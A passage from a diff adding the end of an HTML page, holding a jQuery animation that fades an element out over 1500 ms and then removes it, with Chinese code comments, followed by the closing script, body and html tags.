+            "opacity": 0
+            //1500动画的速度
+          }, 1500, function () {
+            //时间到了自动删除
+            $i.remove();
+          });
+        });
+      })
+      ;
+    </script>
+  
+
+
+
+
+
+
+
+
+</body>
+</html>
